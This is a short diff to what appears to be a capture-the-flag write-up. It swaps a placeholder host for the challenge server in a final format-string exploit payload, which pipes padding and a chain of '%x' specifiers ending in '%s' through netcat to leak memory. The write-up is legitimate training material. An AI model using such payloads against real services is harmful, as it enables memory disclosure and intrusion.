@@ -10,4 +10,4 @@ You can also find out by incrementing the number of %x's and ending with a %s.
 
 The final payload is:
 
-    python -c "print 'A'*64 + '%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%s'" | nc server thing
+    python -c "print 'A'*64 + '%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%s'" | nc introctf.me 11111
